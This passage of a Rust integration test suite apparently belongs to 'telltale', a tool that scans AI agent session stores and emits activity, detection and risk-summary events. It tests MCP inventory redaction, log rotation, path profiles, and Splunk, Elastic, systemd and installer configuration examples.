        }
        command.output().expect("run telltale")
    };

    let first = run_scan(false);
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("summary json");
    assert_eq!(first_summary["activity_count"], 1);
    assert_eq!(first_summary["emitted_count"], 1);

    let mut state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
            .expect("state parses");
    state["baseline_snapshots"]["snapshots"] = serde_json::json!({});
    state["baseline_source_contributions"] = serde_json::json!({});
    state["source_observations"] = serde_json::json!({});
    fs::write(
        &state_path,
        serde_json::to_string_pretty(&state).expect("serialize state"),
    )
    .expect("rewrite state");

    let rebuilt = run_scan(true);
    assert!(
        rebuilt.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&rebuilt.stderr)
    );
    let rebuilt_summary: Value = serde_json::from_slice(&rebuilt.stdout).expect("summary json");
    assert_eq!(rebuilt_summary["activity_count"], 1);
    assert_eq!(rebuilt_summary["emitted_count"], 0);

    let rebuilt_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("rebuilt state json"))
            .expect("rebuilt state parses");
    assert!(
        rebuilt_state["baseline_snapshots"]["snapshots"]
            .as_object()
            .is_some_and(|snapshots| !snapshots.is_empty())
    );
    assert!(
        rebuilt_state["baseline_source_contributions"]
            .as_object()
            .is_some_and(|contributions| contributions.len() == 1)
    );
    assert!(
        rebuilt_state["source_observations"]
            .as_object()
            .is_some_and(|observations| observations.len() == 1)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    assert_eq!(lines.lines().count(), 3);
}

#[test]
fn scan_once_can_emit_activity_events() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(summary["activity_count"].as_u64().unwrap_or_default() > 0);
    assert_eq!(summary["detection_count"], 36);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert!(events.iter().any(|event| {
        event["event_type"] == "activity"
            && event["client"] == "opencode"
            && (event["severity"] == "informational" || event["severity"] == "low")
    }));
}

#[cfg(target_os = "linux")]
#[test]
fn scan_once_persists_opencode_sqlite_part_cursor() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("home");
    let opencode_dir = root.join(".local/share/opencode");
    fs::create_dir_all(&opencode_dir).expect("opencode dir");
    let db_path = opencode_dir.join("opencode.db");
    let conn = Connection::open(&db_path).expect("open db");
    conn.execute_batch(
        "create table message (
            id text primary key,
            session_id text not null,
            time_created integer not null,
            time_updated integer not null,
            data text not null
        );
        create table part (
            id text primary key,
            message_id text not null,
            session_id text not null,
            time_created integer not null,
            time_updated integer not null,
            data text not null
        );",
    )
    .expect("schema");
    conn.execute(
        "insert into message (id, session_id, time_created, time_updated, data)
         values (?1, ?2, ?3, ?4, ?5)",
        (
            "message-a",
            "session-a",
            1_775_000_000_000_i64,
            1_775_000_000_000_i64,
            serde_json::json!({"role": "assistant"}).to_string(),
        ),
    )
    .expect("insert message");
    conn.execute(
        "insert into part (id, message_id, session_id, time_created, time_updated, data)
         values (?1, ?2, ?3, ?4, ?5, ?6)",
        (
            "part-a",
            "message-a",
            "session-a",
            1_775_000_001_000_i64,
            1_775_000_001_000_i64,
            serde_json::json!({"type": "text", "text": "benign assistant response"}).to_string(),
        ),
    )
    .expect("insert part");
    drop(conn);

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--emit-activity",
            "--client",
            "opencode",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_counts"]["opencode.sqlite"], 1);

    let state: Value = serde_json::from_str(&fs::read_to_string(state_path).expect("state file"))
        .expect("state json");
    let cursors = state["sqlite_ingestion_cursors"]
        .as_object()
        .expect("sqlite cursors");
    assert_eq!(cursors.len(), 1);
    let cursor = cursors.values().next().expect("cursor");
    assert_eq!(cursor["table"], "part");
    assert_eq!(cursor["last_time_updated"], 1_775_000_001_000_i64);
}

#[test]
fn scan_once_activity_includes_static_mcp_inventory_events() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("home");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    fs::create_dir_all(&root).expect("root dir");
    fs::write(
        root.join(".mcp.json"),
        r#"{
            "mcpServers": {
                "github": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-github"],
                    "env": {"GITHUB_TOKEN": "synthetic-secret"},
                    "tools": [{"name": "list_issues"}, {"name": "create_issue"}]
                },
                "placeholder": {
                    "args": ["--flag-only"]
                }
            }
        }"#,
    )
    .expect("mcp config");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--emit-activity",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["activity_count"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let inventory = events
        .iter()
        .find(|event| {
            event["event_type"] == "activity"
                && event["session_id"] == "mcp_inventory"
                && event["tool_name"] == "mcp::github"
        })
        .expect("mcp inventory event");
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    assert!(
        validator.is_valid(inventory),
        "mcp inventory activity event should match schema: {inventory}"
    );
    let unsupported_inventory = events
        .iter()
        .find(|event| {
            event["event_type"] == "activity"
                && event["session_id"] == "mcp_inventory"
                && event["tool_name"] == "mcp::placeholder"
        })
        .expect("unsupported mcp inventory event");
    assert!(
        validator.is_valid(unsupported_inventory),
        "unsupported mcp inventory activity event should match schema: {unsupported_inventory}"
    );
    assert!(
        inventory["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "mcp_inventory")
    );
    let evidence = inventory["evidence"][0]["redacted_value"]
        .as_str()
        .expect("evidence");
    assert!(evidence.contains("list_issues"));
    assert!(evidence.contains("GITHUB_TOKEN"));
    assert!(!evidence.contains("synthetic-secret"));
    assert!(
        unsupported_inventory["tags"]
            .as_array()
            .expect("unsupported tags")
            .iter()
            .any(|tag| tag == "mcp_inventory_unsupported")
    );
    let unsupported_evidence: Value = serde_json::from_str(
        unsupported_inventory["evidence"][0]["redacted_value"]
            .as_str()
            .expect("unsupported evidence"),
    )
    .expect("unsupported evidence json");
    assert_eq!(unsupported_evidence["supported"], false);
    assert_eq!(
        unsupported_evidence["unsupported_reason"],
        "missing_command_or_url"
    );
}

#[test]
fn scan_once_can_emit_session_risk_summary_events() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--emit-session-risk-summary",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(
        summary["session_risk_summary_count"]
            .as_u64()
            .unwrap_or_default()
            > 0
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let summary_events = events
        .iter()
        .filter(|event| event["event_type"] == "session_risk_summary")
        .collect::<Vec<_>>();
    assert!(!summary_events.is_empty(), "session risk summary events");
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    for summary_event in &summary_events {
        assert!(
            validator.is_valid(summary_event),
            "session_risk_summary event should match schema: {summary_event}"
        );
        let contribution_total = summary_event["risk_contributions"]
            .as_array()
            .expect("risk contributions")
            .iter()
            .map(|contribution| {
                contribution["points"]
                    .as_u64()
                    .expect("contribution points")
            })
            .sum::<u64>();
        assert_eq!(summary_event["risk_score"], contribution_total);
    }
    assert!(summary_events.iter().any(|event| {
        event["risk_score"].as_u64().unwrap_or_default() == 0
            && event["risk_contributions"]
                .as_array()
                .is_some_and(Vec::is_empty)
    }));
    let summary_event = summary_events
        .iter()
        .find(|event| event["risk_score"].as_u64().unwrap_or_default() > 0)
        .expect("positive session risk summary event");
    assert!(
        summary_event["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "risk_summary")
    );
    assert!(
        summary_event["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .any(|item| item["field"] == "event_counts")
    );
    assert!(
        summary_event["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .any(|item| item["field"] == "risky_action_count")
    );
}

#[test]
fn scan_dry_run_session_risk_summary_does_not_write_log() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("scan-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--emit-activity",
            "--emit-session-risk-summary",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], Value::Null);
    assert!(
        summary["session_risk_summary_count"]
            .as_u64()
            .unwrap_or_default()
            > 0
    );
    assert!(!log_path.exists(), "dry-run should not write JSONL output");
}

#[test]
fn shipper_examples_target_default_jsonl_path() {
    let filebeat = include_str!("../../config/examples/filebeat-filestream.yml");
    assert!(filebeat.contains("/var/log/telltale/telltale-events.jsonl"));
    assert!(filebeat.contains("filestream"));
    assert!(filebeat.contains("ndjson"));

    let logrotate = include_str!("../../config/examples/telltale-logrotate");
    assert!(logrotate.contains("/var/log/telltale/telltale-events.jsonl"));
    assert!(logrotate.contains("daily"));
    assert!(logrotate.contains("rotate 14"));
    assert!(logrotate.contains("extension .jsonl"));
    assert!(logrotate.contains("create 0640 telltale telltale-logs"));
    assert!(logrotate.contains("su telltale telltale-logs"));
    assert!(
        !logrotate.contains("copytruncate"),
        "JSONL rotation should avoid copytruncate by default"
    );

    // The Splunk UF helper ships as a tracked, portable example. Its defaults
    // must target the Linux `system` path profile used by managed/Splunk-forwarded
    // deployments, not stale repo-local or host-absolute paths.
    let splunk_uf_setup = include_str!("../../scripts/slunk_uf_set_up");
    assert!(splunk_uf_setup.contains("TELLTALE_LOG_PATH:-/var/log/telltale/telltale-events.jsonl"));
    assert!(splunk_uf_setup.contains("TELLTALE_INDEX:-telltale"));
    assert!(splunk_uf_setup.contains("TELLTALE_SOURCETYPE:-telltale:json"));
    assert!(splunk_uf_setup.contains("[telltale:json]"));
    assert!(splunk_uf_setup.contains("source = telltale"));
    assert!(
        splunk_uf_setup.contains("COPILOT_LOG_DIR:-/var/log/telltale/copilot"),
        "splunk UF helper must default COPILOT_LOG_DIR to the system-profile copilot path"
    );
}

#[cfg(unix)]
#[test]
fn splunk_uf_helper_renders_canonical_stanzas() {
    let temp = tempdir().expect("tempdir");
    let uf_home = temp.path().join("splunkforwarder");
    fs::create_dir_all(&uf_home).expect("UF home");
    let script = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("scripts/slunk_uf_set_up");
    let output = Command::new("bash")
        .arg(script)
        .env("UF_HOME", &uf_home)
        .env("INDEXER_IPS", "127.0.0.1:9997")
        .env("RESTART_FORWARDER", "0")
        .env("ENABLE_COPILOT_MONITOR", "1")
        .output()
        .expect("run Splunk UF helper");
    assert!(
        output.status.success(),
        "UF helper failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let local = uf_home.join("etc/system/local");
    let inputs = fs::read_to_string(local.join("inputs.conf")).expect("rendered inputs");
    assert_eq!(
        inputs,
        "[monitor:///var/log/telltale/telltale-events.jsonl]\n\
disabled = false\n\
sourcetype = telltale:json\n\
index = telltale\n\
source = telltale\n\
crcSalt = <SOURCE>\n\
\n\
[monitor:///var/log/telltale/copilot]\n\
disabled = false\n\
sourcetype = copilot:json\n\
index = main\n\
source = telltale\n\
whitelist = \\.log$\n\
crcSalt = <SOURCE>\n",
        "rendered inputs.conf must contain the canonical scoped stanzas"
    );
    let props = fs::read_to_string(local.join("props.conf")).expect("rendered props");
    assert_eq!(
        props,
        "[telltale:json]\n\
SHOULD_LINEMERGE = false\n\
LINE_BREAKER = ([\\r\\n]+)\n\
TIME_PREFIX = ^\\{\"timestamp\":\"\n\
TIME_FORMAT = %Y-%m-%dT%H:%M:%S.%3NZ\n\
MAX_TIMESTAMP_LOOKAHEAD = 30\n\
TZ = UTC\n\
INDEXED_EXTRACTIONS = json\n\
KV_MODE = none\n\
TRUNCATE = 0\n\
\n\
[copilot:json]\n\
SHOULD_LINEMERGE = false\n\
LINE_BREAKER = ([\\r\\n]+)\n\
TIME_PREFIX = \"timestamp\":\"\n\
TIME_FORMAT = %Y-%m-%dT%H:%M:%S.%3NZ\n\
MAX_TIMESTAMP_LOOKAHEAD = 30\n\
KV_MODE = json\n\
TRUNCATE = 0\n",
        "rendered props.conf must contain the canonical scoped stanzas"
    );
    assert_eq!(
        fs::read_to_string(local.join("outputs.conf")).expect("rendered outputs"),
        "[tcpout]\ndefaultGroup = telltale_indexers\n\n[tcpout:telltale_indexers]\nserver = 127.0.0.1:9997\nforceTimebasedAutoLB = true\nautoLBFrequency = 30\n"
    );
}

#[test]
fn elastic_template_preserves_native_u64_risk_fields() {
    let template: Value = serde_json::from_str(include_str!(
        "../../config/examples/elastic-telltale-index-template.json"
    ))
    .expect("elastic template json");
    let patterns = template["index_patterns"]
        .as_array()
        .expect("elastic index patterns");
    assert_eq!(
        patterns
            .iter()
            .filter_map(Value::as_str)
            .collect::<Vec<_>>(),
        ["telltale-events", "telltale-events-*"]
    );
    let role: Value = serde_json::from_str(include_str!(
        "../../config/examples/elastic-telltale-role.json"
    ))
    .expect("elastic role json");
    assert_eq!(
        role["indices"][0]["names"],
        serde_json::json!(["telltale-events", "telltale-events-*"])
    );
    assert_eq!(role["cluster"], serde_json::json!([]));
    assert_eq!(
        role["indices"][0]["privileges"],
        serde_json::json!(["auto_configure", "index"])
    );
    let properties = &template["template"]["mappings"]["properties"];
    assert_eq!(properties["risk_score"]["type"], "unsigned_long");
    assert_eq!(properties["risk_contributions"]["type"], "nested");
    assert_eq!(
        properties["risk_contributions"]["properties"]["points"]["type"],
        "unsigned_long"
    );
}

#[test]
fn install_telltale_script_is_user_first_and_sudo_free() {
    let script = include_str!("../../scripts/install-telltale");

    // No sudo or root in the default path.
    assert!(
        !script.contains("sudo "),
        "installer must not use sudo in the user-first path"
    );
    assert!(
        !script.contains("useradd"),
        "installer must not create system users"
    );
    assert!(
        !script.contains("groupadd"),
        "installer must not create system groups"
    );

    // No SIEM/shipper configuration (product names in comments are fine;
    // we're checking that the script doesn't actually configure them).
    assert!(
        !script.contains("outputs.conf"),
        "installer must not configure Splunk UF outputs"
    );
    assert!(
        !script.contains("inputs.conf"),
        "installer must not configure Splunk UF inputs"
    );
    assert!(
        !script.contains("filebeat.yml"),
        "installer must not configure Filebeat"
    );

    // User-first defaults.
    assert!(
        script.contains("${HOME:-}/.local/bin"),
        "default install dir should be user-writable"
    );
    assert!(
        !script.contains("--path-profile system"),
        "user-first installer must not default to system profile"
    );

    // Runs as the invoking user with user-level scheduling.
    assert!(
        script.contains("systemctl --user"),
        "timer should be user-level, not system"
    );
    assert!(
        script.contains("timers.target"),
        "timer target should be user timers.target"
    );

    // Architecture detection for Linux release assets.
    assert!(script.contains("x86_64-unknown-linux-gnu"));
    assert!(script.contains("aarch64-unknown-linux-gnu"));

    // Hosted-site cutover is outside this repository's installer boundary.
    assert!(!script.contains("agentarchaeology.ai/telltale_install.sh"));
}

#[test]
fn scan_rotates_jsonl_when_max_size_exceeded() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("logs/telltale-events.jsonl");

    // First scan creates the file (no rotation since file doesn't exist yet).
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-max-size",
            "1",
            "--log-rotate-keep",
            "3",
            "--max-sources",
            "1",
            "--emit-activity",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "first scan stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        log_path.exists(),
        "active log file should exist after first scan"
    );

    // Second scan should trigger rotation (file exists and exceeds 1 byte).
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-max-size",
            "1",
            "--log-rotate-keep",
            "3",
            "--max-sources",
            "1",
            "--emit-activity",
            "--backfill",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "second scan stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    // The active file should still exist with fresh content.
    assert!(
        log_path.exists(),
        "active log file should exist after rotation"
    );

    // At least one rotated file should exist.
    let parent = log_path.parent().expect("parent");
    let rotated: Vec<_> = std::fs::read_dir(parent)
        .expect("read dir")
        .filter_map(Result::ok)
        .filter(|e| {
            let name = e.file_name();
            let name = name.to_string_lossy();
            name.starts_with("telltale-events-") && name.ends_with(".jsonl")
        })
        .collect();
    assert!(
        !rotated.is_empty(),
        "expected at least one rotated file after exceeding max size"
    );

    // Rotated file should have a date in the name.
    let rotated_name = rotated[0].file_name().to_string_lossy().to_string();
    assert!(
        rotated_name.contains("telltale-events-2"),
        "rotated file should be date-stamped: {rotated_name}"
    );
}

#[test]
fn scan_with_log_rotate_disabled_does_not_rotate() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("logs/telltale-events.jsonl");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-disabled",
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    assert!(log_path.exists(), "active log file should exist");

    // No rotated files should exist.
    let parent = log_path.parent().expect("parent");
    let rotated: Vec<_> = std::fs::read_dir(parent)
        .expect("read dir")
        .filter_map(Result::ok)
        .filter(|e| {
            let name = e.file_name();
            let name = name.to_string_lossy();
            name.starts_with("telltale-events-") && name.ends_with(".jsonl")
        })
        .collect();
    assert!(
        rotated.is_empty(),
        "no rotated files when --log-rotate-disabled is set"
    );
}

#[test]
fn scan_project_path_profile_separates_jsonl_telemetry_from_state() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], "logs/telltale-events.jsonl");
    assert!(temp.path().join("logs/telltale-events.jsonl").is_file());
    assert!(temp.path().join("state/telltale-state.json").is_file());
    assert!(!temp.path().join("logs/telltale-state.json").exists());
}

#[test]
fn scan_uses_env_log_and_state_defaults() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("env-logs/telltale-events.jsonl");
    let state_path = temp.path().join("env-state/telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .env("TELLTALE_LOG_PATH", &log_path)
        .env("TELLTALE_STATE_PATH", &state_path)
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], log_path.display().to_string());
    assert!(log_path.is_file());
    assert!(state_path.is_file());
    assert!(!temp.path().join("logs/telltale-events.jsonl").exists());
    assert!(!temp.path().join("state/telltale-state.json").exists());
}

#[test]
fn systemd_examples_run_periodic_scan_with_env_defaults() {
    let service = include_str!("../../config/examples/telltale-scan.service");
    assert!(service.contains("User=telltale"));
    assert!(service.contains("Group=telltale"));
    assert!(service.contains("WorkingDirectory=/var/lib/telltale"));
    assert!(service.contains("TELLTALE_LOG_PATH=/var/log/telltale/telltale-events.jsonl"));
    assert!(service.contains("TELLTALE_STATE_PATH=/var/lib/telltale/telltale-state.json"));
    assert!(service.contains("TELLTALE_SCAN_ROOT=/home/telltale"));
    assert!(service.contains("EnvironmentFile=-/etc/telltale/telltale.env"));
    assert!(
        service
            .find("TELLTALE_SCAN_ROOT=/home/telltale")
            .expect("scan root default")
            < service
                .find("EnvironmentFile=-/etc/telltale/telltale.env")
                .expect("env file")
    );
    assert!(service.contains("ExecStart=/usr/bin/env -- \"/usr/local/bin/telltale\""));
    assert!(service.contains("--root \"${TELLTALE_SCAN_ROOT}\""));
    assert!(!service.contains("ExecStart=:"));
    assert!(service.contains("--emit-activity"));
    assert!(service.contains("--path-profile system"));
    assert!(
        service.contains("--log-rotate-disabled"),
        "system profile service must disable built-in rotation when OS-native logrotate is used"
    );
    assert!(service.contains("ReadWritePaths=/var/log/telltale /var/lib/telltale"));

    let timer = include_str!("../../config/examples/telltale-scan.timer");
    assert!(timer.contains("OnActiveSec=1min"));
    assert!(!timer.contains("OnBootSec="));
    assert!(timer.contains("OnUnitActiveSec=5min"));
    assert!(timer.contains("Unit=telltale-scan.service"));
    assert!(timer.contains("WantedBy=timers.target"));

    let timer_template = include_str!("../../config/examples/telltale-scan.timer.in");
    assert!(timer_template.contains("OnActiveSec=1min"));
    assert!(!timer_template.contains("OnBootSec="));
    assert!(timer_template.contains("OnUnitActiveSec=5min"));
    assert!(timer_template.contains("Unit=telltale-scan.service"));
    assert!(timer_template.contains("WantedBy=timers.target"));

    let service_template = include_str!("../../config/examples/telltale-scan.service.in");
    assert!(service_template.contains("Environment=\"TELLTALE_SCAN_ROOT=%h\""));
    assert!(service_template.contains("EnvironmentFile=-\"__TELLTALE_ENV_PATH__\""));
    assert!(service_template.contains("ExecStart=/usr/bin/env -- \"__BINDIR__/telltale\""));
    assert!(service_template.contains("--root \"${TELLTALE_SCAN_ROOT}\""));
    assert!(!service_template.contains("ExecStart=:"));

    let task = include_str!("../../config/examples/telltale-scan-task.xml");
    assert!(task.contains(r#"<URI>\TelltaleScan</URI>"#));
    assert!(task.contains(r#"<Command>%LOCALAPPDATA%\Telltale\telltale.exe</Command>"#));
}

#[test]
fn scan_invalid_root_reports_privacy_safe_fallback_diagnostics() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("invalid-root-sentinel");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .arg("--state-path")
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stdout.contains("invalid-root-sentinel"));
    assert!(!stderr.contains("invalid-root-sentinel"));
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_discovery"]["checked_status"], "first_error");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        "invalid_root"
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        true
    );
    assert_eq!(summary["source_discovery"]["returned_source_count"], 0);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 0);
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([
            {
                "code": "source_discovery_degraded",
                "classification": "observed_failure",
                "basis": "source_discovery"
            },
            {
                "code": "no_sources_selected",
                "classification": "suspicious_zero",
                "basis": "source_selection"
            }
        ])
    );
}

#[test]
fn project_config_failures_are_aggregated_without_path_or_error_leakage() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("invalid-root-sentinel");
    let project = temp.path().join("valid-project");
    fs::create_dir_all(project.join("logs/copilot")).expect("project");
    fs::copy(
        "tests/fixtures/session_stores/copilot/process-uc001.log",
        project.join("logs/copilot/process-uc001.log"),
    )
    .expect("copilot project source");
    let good_config = temp.path().join("good-projects.yaml");
    let bad_config = temp.path().join("bad-projects-error-sentinel.yaml");
    fs::write(
        &good_config,
        format!(
            "projects:\n  - name: valid\n    path: '{}'\n",
            project.display()
        ),
    )
    .expect("good project config");
    fs::write(&bad_config, "projects: [not valid yaml").expect("bad project config");
    let log_path = temp.path().join("events.jsonl");
    let state_path = temp.path().join("state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--no-local-config", "--root"])
        .arg(&root)
        .args(["--project-config"])
        .arg(&good_config)
        .args(["--project-config"])
        .arg(&bad_config)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    for sentinel in ["bad-projects-error-sentinel", "not valid yaml"] {
        assert!(!stdout.contains(sentinel));
        assert!(!stderr.contains(sentinel));
    }
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_discovery"]["checked_status"], "first_error");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        "invalid_root"
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        true
    );
    assert!(
        summary["source_discovery"]["returned_source_count"]
            .as_u64()
            .unwrap()
            > 0
    );
    assert!(
        summary["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|warning| warning["code"] == "source_discovery_degraded")
    );
    assert_eq!(
        summary["source_discovery"]["project_configuration"],
        serde_json::json!({
            "mode": "configured_documents",
            "document_attempt_count": 2,
            "document_success_count": 1,
            "document_failure_count": 1,
            "loaded_project_count": 1,
        })
    );
    assert!(
        summary["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|warning| warning["code"] == "project_config_load_failed")
    );
    let events = fs::read_to_string(&log_path).expect("events");
    assert!(!events.contains("bad-projects-error-sentinel"));
    assert!(!events.contains("not valid yaml"));
}

#[test]
fn scan_once_continues_after_malformed_source() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("positive fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
